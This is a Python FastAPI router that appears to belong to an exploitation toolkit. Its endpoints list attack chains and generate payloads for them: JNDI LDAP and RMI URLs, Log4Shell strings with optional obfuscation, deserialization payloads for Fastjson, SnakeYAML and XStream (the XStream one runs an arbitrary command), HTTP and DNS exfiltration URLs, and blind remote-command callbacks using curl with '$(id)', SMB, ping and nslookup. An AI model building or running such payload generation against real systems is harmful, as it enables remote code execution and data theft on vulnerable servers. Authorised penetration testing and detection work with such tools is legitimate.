from __future__ import annotations

import logging
from typing import Any

import httpx
from fastapi import APIRouter, Depends, HTTPException, Query, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from ..auth.deps import current_user
from ..config import get_settings
from ..db import get_session
from ..models import OobToken, User
from ..schemas import PayloadRequest, PayloadResponse
from . import jndi_builder as jb
from .catalog import CATALOG, CATALOG_BY_ID, ChainEntry

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/payloads", tags=["payloads"])


async def _sidecar_chain_status() -> tuple[set[str] | None, dict[str, Any]]:
    s = get_settings()
    try:
        async with httpx.AsyncClient(timeout=2.0) as cli:
            r = await cli.get(f"{s.sidecar_url}/chains")
        if r.status_code != 200:
            return None, {"error": f"bytecode-service /chains returned HTTP {r.status_code}"}
        data = r.json()
        return set(data.get("chains", [])), data
    except httpx.ConnectError:
        return None, {"error": "bytecode-service is not running"}
    except Exception as e:
        return None, {"error": str(e)}


def _unavailable_reason(entry: ChainEntry, sidecar_meta: dict[str, Any]) -> str:
    if entry.id.startswith("jchains_") and not sidecar_meta.get("java_chains_available", True):
        return "java-chains is not available in the sidecar runtime."
    return "bytecode-service does not currently support this chain."


def _chain_out(
    entry: ChainEntry,
    supported_sidecar_chains: set[str] | None = None,
    sidecar_meta: dict[str, Any] | None = None,
) -> dict[str, Any]:
    sidecar_meta = sidecar_meta or {}
    available = True
    unavailable_reason = ""
    if entry.requires_sidecar:
        if supported_sidecar_chains is None:
            available = False
            unavailable_reason = sidecar_meta.get("error", "bytecode-service availability is unknown.")
        elif entry.id not in supported_sidecar_chains:
            available = False
            unavailable_reason = _unavailable_reason(entry, sidecar_meta)
    return {
        "id": entry.id,
        "category": entry.category,
        "sub_category": entry.sub_category,
        "name": entry.name,
        "description": entry.description,
        "requires_sidecar": entry.requires_sidecar,
        "available": available,
        "unavailable_reason": unavailable_reason,
        "tags": entry.tags,
        "params": [
            {
                "name": p.name,
                "type": p.type,
                "default": p.default,
                "options": p.options,
                "required": p.required,
                "description": p.description,
            }
            for p in entry.params
        ],
    }


@router.get("/catalog")
async def get_catalog(
    category: str | None = None,
    q: str | None = None,
    _user: User = Depends(current_user),
) -> list[dict[str, Any]]:
    supported_sidecar_chains, sidecar_meta = await _sidecar_chain_status()
    entries = CATALOG
    if category:
        entries = [e for e in entries if e.category == category]
    if q:
        q_low = q.lower()
        entries = [
            e for e in entries
            if q_low in e.name.lower() or q_low in e.description.lower() or any(q_low in t for t in e.tags)
        ]
    return [_chain_out(e, supported_sidecar_chains, sidecar_meta) for e in entries]


@router.get("/catalog/{chain_id}")
async def get_chain(chain_id: str, _user: User = Depends(current_user)) -> dict[str, Any]:
    entry = CATALOG_BY_ID.get(chain_id)
    if not entry:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "chain not found")
    supported_sidecar_chains, sidecar_meta = await _sidecar_chain_status()
    return _chain_out(entry, supported_sidecar_chains, sidecar_meta)


@router.post("/generate", response_model=PayloadResponse)
async def generate_payload(
    body: PayloadRequest,
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> PayloadResponse:
    s = get_settings()
    p = body.params
    chain_id = body.type

    # ── Pure-Python chains (no sidecar) ──────────────────────────────────────
    if chain_id == "jndi_ldap_basic":
        token = p.get("token") or body.token or ""
        cn = p.get("class_name", "Exploit")
        url = jb.jndi_ldap_url(token, s, cn)
        return PayloadResponse(type=chain_id, content_type="text/plain", value=url)

    if chain_id == "jndi_rmi_basic":
        token = p.get("token") or body.token or ""
        cn = p.get("class_name", "Exploit")
        url = jb.jndi_rmi_url(token, s, cn)
        return PayloadResponse(type=chain_id, content_type="text/plain", value=url)

    if chain_id == "exfil_log4j":
        token = p.get("token") or body.token or ""
        protocol = p.get("protocol", "ldap")
        if protocol not in ("ldap", "rmi"):
            raise HTTPException(
                status.HTTP_501_NOT_IMPLEMENTED,
                "Only ldap and rmi Log4Shell delivery are implemented.",
            )
        val = jb.log4shell_string(token, s, protocol, p.get("obfuscate", "none"))
        return PayloadResponse(type=chain_id, content_type="text/plain", value=val)

    if chain_id == "exfil_fastjson":
        token = p.get("token") or body.token or ""
        protocol = p.get("ldap_or_rmi", "ldap")
        if protocol not in ("ldap", "rmi"):
            raise HTTPException(
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                "protocol must be ldap or rmi.",
            )
        val = jb.fastjson_payload(token, s, protocol)
        return PayloadResponse(type=chain_id, content_type="application/json", value=val)

    if chain_id == "exfil_snakeyaml":
        token = p.get("token") or body.token or ""
        val = jb.snakeyaml_payload(token, s, p.get("mode", "spi"))
        return PayloadResponse(type=chain_id, content_type="text/yaml", value=val)

    if chain_id == "exfil_xstream":
        val = jb.xstream_payload(p.get("cmd", "id"), p.get("chain", "EventHandler"))
        return PayloadResponse(type=chain_id, content_type="application/xml", value=val)

    if chain_id == "exfil_http_get":
        token = p.get("token") or body.token or ""
        urls = jb.http_exfil_url(token, s, p.get("data_expr", ""))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=urls["log4j_trigger"], urls=urls)

    if chain_id == "exfil_dns_lookup":
        token = p.get("token") or body.token or ""
        info = jb.dns_exfil_label(token, s, p.get("data_expr", ""))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["template_domain"], meta=info)

    # ── Blind / no-internet payloads ──────────────────────────────────────────
    if chain_id == "blind_time_sleep":
        info = jb.blind_time_sleep(int(p.get("seconds", 5)), p.get("os", "linux"))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["cmd"], meta=info)

    if chain_id == "blind_icmp_ping":
        oob_ip = p.get("oob_ip") or s.public_address
        info = jb.blind_icmp_ping(oob_ip, int(p.get("count", 3)), p.get("os", "linux"))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["auto_cmd"], meta=info)

    if chain_id == "blind_http_oob":
        token = p.get("token") or body.token or ""
        info = jb.blind_http_oob(token, s, p.get("data_expr", "$(id)"), p.get("method", "curl"))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["cmd"], urls={"callback_url": info["callback_url"]}, meta=info)

    if chain_id == "blind_smb_oob":
        oob_ip = p.get("oob_ip") or s.public_address
        info = jb.blind_smb_oob(oob_ip, p.get("share", "share"))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["cmd"], meta=info)

    if chain_id == "blind_dns_internal":
        token = p.get("token") or body.token or ""
        info = jb.blind_dns_internal(token, s, p.get("data_expr", "$(hostname)"), p.get("dns_zone", ""))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["dig_cmd"], meta=info)

    if chain_id == "blind_file_write":
        info = jb.blind_file_write(p.get("path", "/tmp/oob.txt"), p.get("content", "oob_rce_ok"))
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["linux_cmd"], meta=info)

    if chain_id == "blind_ceye_like":
        token = p.get("token") or body.token or ""
        zone = p.get("dns_zone", s.dns_zone)
        info = jb.blind_dns_internal(token, s, "$(hostname)", zone)
        return PayloadResponse(type=chain_id, content_type="text/plain",
                               value=info["nslookup_cmd"], meta=info)

    # ── Sidecar-delegated chains ──────────────────────────────────────────────
    entry = CATALOG_BY_ID.get(chain_id)
    if entry and entry.requires_sidecar:
        supported_sidecar_chains, sidecar_meta = await _sidecar_chain_status()
        if supported_sidecar_chains is None:
            raise HTTPException(
                status.HTTP_503_SERVICE_UNAVAILABLE,
                sidecar_meta.get("error", "bytecode-service is not running"),
            )
        if chain_id not in supported_sidecar_chains:
            raise HTTPException(
                status.HTTP_503_SERVICE_UNAVAILABLE if chain_id.startswith("jchains_")
                else status.HTTP_422_UNPROCESSABLE_ENTITY,
                _unavailable_reason(entry, sidecar_meta),
            )
        try:
            async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
                r = await cli.post(
                    f"{s.sidecar_url}/generate",
                    json={"chain": chain_id, "params": p},
                )
            if r.status_code == 200:
                data = r.json()
                return PayloadResponse(
                    type=chain_id,
                    content_type=data.get("content_type", "application/octet-stream"),
                    value=data.get("value", ""),
                    urls=data.get("urls", {}),
                    meta=data.get("meta", {}),
                )
            raise HTTPException(status.HTTP_502_BAD_GATEWAY, f"sidecar error: {r.text[:200]}")
        except httpx.ConnectError:
            raise HTTPException(status.HTTP_503_SERVICE_UNAVAILABLE, "bytecode-service is not running")

    raise HTTPException(status.HTTP_400_BAD_REQUEST, f"unknown payload type: {chain_id}")
